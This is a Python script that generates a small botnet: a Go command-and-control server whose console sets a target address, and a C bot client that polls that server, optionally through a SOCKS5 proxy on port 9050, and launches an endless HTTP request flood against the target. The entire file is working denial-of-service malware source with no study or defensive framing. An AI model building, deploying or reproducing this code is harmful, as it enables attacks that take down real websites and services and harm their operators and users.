SERVER_FNAME = "server.go"
CLIENT_FNAME = "bot.c"

URL_ACTION = "/cmd"
IS_SOCKS5_CONNECT = False

ADDR = "127.0.0.1"
PORT = 8080
SOCKS5_PORT = 9050

def main():
	with open(SERVER_FNAME, "w") as file:
		file.write(SERVER_CODE)

	with open(CLIENT_FNAME, "w") as file:
		file.write(CLIENT_CODE)

SERVER_CODE = """
package main

import (
	"os"
	"fmt"
	"time"
	"bufio"
	"strings"
	"net/http"
	"encoding/json"
)

var (
	Target = "NULL"
)

func main() {
	fmt.Println("Server is listening...\\n")
	go adminConsole()
	http.HandleFunc("/", indexPage)
	http.HandleFunc(""" + f"\"{URL_ACTION}\"" + """, cmdPage)
	http.ListenAndServe(""" + f"\":{PORT}\"" + """, nil)
}

func help() string {
	return `
1. exit // exit from program
2. help // help info for commands
3. targ // target ipv4:port/path
`
}

func adminConsole() {
	var (
		message string
		splited []string
	)
	for {
		message = inputString("> ")
		splited = strings.Split(message, " ")
		switch splited[0] {
		case "exit":
			os.Exit(0)
		case "help":
			fmt.Println(help())
		case "targ":
			if len(splited) != 2 {
				fmt.Printf("target = '%s'\\n\\n", Target)
				continue
			}
			Target = splited[1]
			fmt.Println("target set\\n")
		default:
			fmt.Println("error: command undefined\\n")
		}
	}
}

func inputString(begin string) string {
	fmt.Print(begin)
	msg, _ := bufio.NewReader(os.Stdin).ReadString('\\n')
	return strings.Replace(msg, "\\n", "", 1)
}

func indexPage(w http.ResponseWriter, r *http.Request) {
    response(w, 0, "success: action completed")
}

func cmdPage(w http.ResponseWriter, r *http.Request) {
	count := 5
	prevTarg := Target
repeat:
	if prevTarg != Target || count == 0 {
		goto close
	}
	count--
	time.Sleep(5 * time.Second)
	goto repeat
close:
	response(w, 0, Target)
}

func response(w http.ResponseWriter, ret int, res string) {
	w.Header().Set("Content-Type", "application/json")
	var resp struct {
		Return int    `json:"return"`
		Result string `json:"result"`
	}
	resp.Return = ret
	resp.Result = res
	json.NewEncoder(w).Encode(resp)
}
"""

CLIENT_CODE = """
#include "extclib/net.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <threads.h>

#define BUFSIZ_1K (1 << 10)
#define BUFSIZ_2K (2 << 10)
#define BUFSIZ_8K (8 << 10)

#define ADDRESS """ + (f"\"{ADDR}\", {PORT}, {SOCKS5_PORT}" if IS_SOCKS5_CONNECT else f"\"{ADDR}\", {PORT}") + """

static void run_ddos(void *target);
static void _stop_thrd(thrd_t *th);

static char *_strncpy(char *output, const char *input, size_t size);

static int stop_ddos = 0;
static int thrd_used = 0;

int main(void) {
	char currtarg[BUFSIZ_2K] = "NULL";
	char newtarg[BUFSIZ_2K];
	char buffer[BUFSIZ_8K];

	net_conn *conn;
	thrd_t th;
	char *ptr;
	int ret;

	char inputs[BUFSIZ_1K];
	sprintf(inputs, "{\\"return\\":%%d,\\"result\\":\\"%%%d[^\\"]\\"}", BUFSIZ_2K-1);

	while(1) {
		conn = """ + ("net_socks5_connect(ADDRESS);" if IS_SOCKS5_CONNECT else "net_connect(ADDRESS);") + """
		if (conn == NULL) {
			sleep(5);
			continue;
		}

		net_http_get(conn, """ + f"\"{URL_ACTION}\"" + """);
		ret = net_recv(conn, buffer, BUFSIZ_8K-1);
		buffer[ret] = '\\0';

		net_close(conn);

		ptr = strstr(buffer, "{");
		if (ptr == NULL) {
			continue;
		}

		ret = -1;
		sscanf(ptr, inputs, &ret, newtarg);
		if (ret != 0) {
			continue;
		}

		if (strcmp(newtarg, currtarg) == 0) {
			continue;
		}

		if (strcmp(newtarg, "NULL") == 0) {
			_strncpy(currtarg, newtarg, BUFSIZ_2K);
			_stop_thrd(&th);
			continue;
		}

		_strncpy(currtarg, newtarg, BUFSIZ_2K);
		_stop_thrd(&th);

		thrd_create(&th, (thrd_start_t)run_ddos, currtarg);
	}
	
	return 0;
}

static void run_ddos(void *target) {
	char buffer[BUFSIZ_2K];
	char addr[BUFSIZ_2K];
	char *path = NULL;
	int port = 0;
	size_t len;
	net_conn *conn;

	_strncpy(addr, (const char *)target, BUFSIZ_2K);
	len = strlen(addr);

	for (size_t i = 0, j = 0; i < len; ++i) {
		if (addr[i] == ':') {
			addr[i] = '\\0';
			j = i + 1;
			continue;
		}
		if (addr[i] == '/') {
			addr[i] = '\\0';
			port = atoi(addr + j);
			addr[i] = '/';
			path = (addr + i);
			break;
		}
	}

	if (port == 0) {
		return;
	}

	thrd_used = 1;

	while(1) {
		if (stop_ddos) {
			break;
		}
		conn = net_connect(addr, port);
		if (conn == NULL) {
			sleep(5);
			continue;
		}
		net_http_get(conn, path);
		net_recv(conn, buffer, BUFSIZ_2K);
		net_close(conn);
	}

	thrd_used = 0;
}

static void _stop_thrd(thrd_t *th) {
	if (thrd_used) {
		stop_ddos = 1;
		thrd_join(*th, NULL);
		stop_ddos = 0;
	}
}

static char *_strncpy(char *output, const char *input, size_t size) {
	char *ret = strncpy(output, input, size-1);
	output[size-1] = '\\0';
	return ret;
}
"""

if __name__ == "__main__":
	main()
